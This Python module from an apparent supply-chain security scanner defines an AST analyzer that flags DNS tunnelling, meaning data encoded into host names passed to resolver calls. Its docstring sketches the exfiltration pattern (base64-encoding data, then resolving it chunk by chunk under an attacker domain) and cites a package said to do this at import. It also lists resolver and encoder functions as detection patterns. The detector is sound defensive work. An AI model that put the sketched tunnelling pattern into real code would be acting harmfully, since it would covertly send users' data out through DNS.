"""Data carried out in DNS names (group A (a)).

A lookup whose host name is built from encoded data sends that data to whoever runs the domain's name
server, through any resolver and any firewall that lets DNS out: `b = urlsafe_b64encode(d)`, then
`getaddrinfo(f"{i}.{b[k:k + 60]}.<domain>", 80)` chunk by chunk (yaml_report_formatter 0.1.0, which
does this with what a Kubernetes API call returned, at import). A host name is a name: one built
from base64, base32 or hex of a value is a message. Hostnames, hashes and UUIDs a program resolves
are not encodings of data it holds, and are left alone.
"""

from __future__ import annotations

import ast
from typing import ClassVar

from cordon_scanner.analysis.python.analyzer_core import AnalyzerCore
from cordon_scanner.analysis.python.pysyntax import PythonSyntax
from cordon_scanner.foundation.capabilities import Capability


class DnsTunnels(AnalyzerCore):
    """`_dns_tunnel` and what it needs."""

    #: Lookups that send their name to a name server.
    RESOLVERS: ClassVar[frozenset[str]] = frozenset(
        {
            "socket.gethostbyname",
            "socket.gethostbyname_ex",
            "socket.getaddrinfo",
            "dns.resolver.resolve",
            "dns.resolver.query",
        }
    )
    #: Calls that turn bytes into text a name can carry.
    ENCODERS: ClassVar[frozenset[str]] = frozenset(
        {
            "base64.b64encode",
            "base64.urlsafe_b64encode",
            "base64.b32encode",
            "base64.b32hexencode",
            "base64.b16encode",
            "base64.b85encode",
            "base64.encodebytes",
            "binascii.hexlify",
            "binascii.b2a_hex",
            "binascii.b2a_base64",
        }
    )
    #: `bytes.hex()`: a method, not the package registry of the same name.
    _HEX_METHOD: ClassVar[str] = "hex"
    #: Methods that keep what an encoded value carries (`.decode()`, `.rstrip("=")`).
    _KEEPS: ClassVar[frozenset[str]] = frozenset(
        {"decode", "replace", "rstrip", "strip", "lower", "upper", "encode"}
    )

    def _dns_tunnel(self, tree: ast.AST) -> None:
        """A resolver handed a name built from encoded data: `dns tunnel: <resolver>`."""
        encoded: set[str] = set()
        for _ in range(4):
            before = len(encoded)
            for node in PythonSyntax.of(tree, ast.Assign):
                if self._encodes(node.value, encoded):
                    encoded.update(t.id for t in node.targets if isinstance(t, ast.Name))
            for loop in PythonSyntax.of(tree, ast.For):
                # `for chunk in chunks(b)` / `for s in [b[i:i+60] for i in ...]`.
                if isinstance(loop.target, ast.Name) and self._carries(loop.iter, encoded):
                    encoded.add(loop.target.id)
            if len(encoded) == before:
                break
        for call in PythonSyntax.of(tree, ast.Call):
            resolver = self._dotted(call.func)
            if resolver not in self.RESOLVERS or not call.args:
                continue
            if self._built_from(call.args[0], encoded):
                self._record(Capability.EGRESS, call, f"dns tunnel: {resolver}")

    def _encodes(self, value: ast.AST, encoded: set[str]) -> bool:
        """An encoder's result, a slice or kept method of an encoded value, or the value itself."""
        if isinstance(value, ast.Call):
            func = value.func
            if self._dotted(func) in self.ENCODERS:
                return True
            if isinstance(func, ast.Attribute):
                if (
                    func.attr == self._HEX_METHOD
                    and not value.args
                    and not self._is_hash_or_uuid(func.value)
                ):
                    return True
                if func.attr in self._KEEPS:
                    return self._encodes(func.value, encoded)
            return False
        if isinstance(value, ast.Subscript):
            return self._encodes(value.value, encoded)
        return isinstance(value, ast.Name) and value.id in encoded

    def _carries(self, iterable: ast.AST, encoded: set[str]) -> bool:
        """An iterable whose items are pieces of an encoded value."""
        if isinstance(iterable, ast.ListComp | ast.GeneratorExp):
            return self._encodes(iterable.elt, encoded)
        if isinstance(iterable, ast.Call):
            return any(self._encodes(a, encoded) for a in iterable.args)
        return self._encodes(iterable, encoded)

    def _built_from(self, host: ast.AST, encoded: set[str]) -> bool:
        """A name assembled with an encoded piece in it: f-string, `+`, `%`, `.format`, `.join`."""
        if isinstance(host, ast.JoinedStr):
            return any(
                isinstance(v, ast.FormattedValue) and self._encodes(v.value, encoded)
                for v in host.values
            )
        if isinstance(host, ast.BinOp):
            return self._built_from(host.left, encoded) or self._built_from(host.right, encoded)
        if (
            isinstance(host, ast.Call)
            and isinstance(host.func, ast.Attribute)
            and host.func.attr in ("format", "join")
        ):
            parts = [*host.args, *(k.value for k in host.keywords)]
            return any(self._encodes(p, encoded) or self._built_from(p, encoded) for p in parts)
        if isinstance(host, ast.List | ast.Tuple):
            return any(self._encodes(e, encoded) for e in host.elts)
        return self._encodes(host, encoded)

    def _is_hash_or_uuid(self, node: ast.AST) -> bool:
        """`hashlib.sha256(x).hex()`-like digests and UUIDs: identifiers, not carried data."""
        dotted = self._dotted(node.func) if isinstance(node, ast.Call) else self._dotted(node)
        return dotted is not None and dotted.startswith(("hashlib.", "uuid.", "hmac.", "secrets."))


__all__ = ["DnsTunnels"]
